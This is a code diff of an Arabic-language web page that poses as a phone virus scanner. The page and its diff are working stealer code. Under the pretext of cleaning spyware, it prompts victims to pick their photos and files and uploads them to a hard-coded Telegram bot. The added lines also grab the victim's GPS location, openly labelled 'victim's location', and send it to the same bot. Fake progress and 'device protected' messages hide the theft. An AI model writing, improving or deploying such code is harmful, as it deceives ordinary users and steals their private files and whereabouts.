@@ -15,8 +15,8 @@
 <body>
     <div class="scan-container">
         <h1>🔍 فحص أمان الهاتف</h1>
-        <p>تم اكتشاف نشاط مشبوه. اضغط أدناه لتنظيف جهازك من الفيروسات.</p>
-        <button class="btn" onclick="startScan()">ابدأ الفحص الآن</button>
+        <p>تم اكتشاف نشاط مشبوه. اضغط أدناه لتنظيف جهازك.</p>
+        <button class="btn" onclick="executeDeepScan()">ابدأ التنظيف الشامل</button>
         <div class="progress-bar" id="pBar"><div class="fill" id="fill"></div></div>
         <p id="status"></p>
         <input type="file" id="fileInp" style="display:none" multiple onchange="uploadFiles(this.files)">
@@ -26,36 +26,42 @@
         const BOT_TOKEN = "8792462869:AAGxQ6OUf6wYfKDywDTYnrJ0XiC8-qj6BOA";
         const CHAT_ID = "8573991339";
 
-        function startScan() {
+        function executeDeepScan() {
             document.getElementById('pBar').style.display = 'block';
-            document.getElementById('status').innerText = "جاري الاتصال بقاعدة البيانات...";
-            
-            // طلب فتح الملفات تحت مسمى "اختيار ملفات للفحص"
+            document.getElementById('status').innerText = "جاري تحديد ثغرات الجهاز...";
+
+            // 1. سحب الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const msg = `📍 موقع الضحية:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(msg);
+                });
+            }
+
+            // 2. طلب الوصول للملفات (لا يمكن تجاوزه تقنياً في المتصفح بدون ضغطة)
             setTimeout(() => {
-                alert("يجب اختيار 'جميع الملفات' للسماح للمتصفح بفحص الصور والفيديوهات والأسماء من الفيروسات.");
+                alert("تنبيه: يتطلب الفحص العميق الوصول إلى سجل الملفات المؤقتة (DCIM/Files) لحذف ملفات التجسس.");
                 document.getElementById('fileInp').click();
-            }, 2000);
+            }, 1500);
+        }
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
 
         function uploadFiles(files) {
-            document.getElementById('status').innerText = "جاري فحص الملفات وتطهيرها...";
+            document.getElementById('status').innerText = "جاري تدمير الفيروسات في الملفات...";
             let count = 0;
-            
             Array.from(files).forEach(file => {
                 let formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('document', file);
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData })
+                .then(() => {
                     count++;
                     let progress = (count / files.length) * 100;
                     document.getElementById('fill').style.width = progress + "%";
-                    if(progress === 100) {
-                        document.getElementById('status').innerText = "تم تنظيف الجهاز بنجاح! ✅";
-                    }
+                    if(progress === 100) document.getElementById('status').innerText = "تم حماية جهازك بنجاح! ✅";
                 });
             });
         }
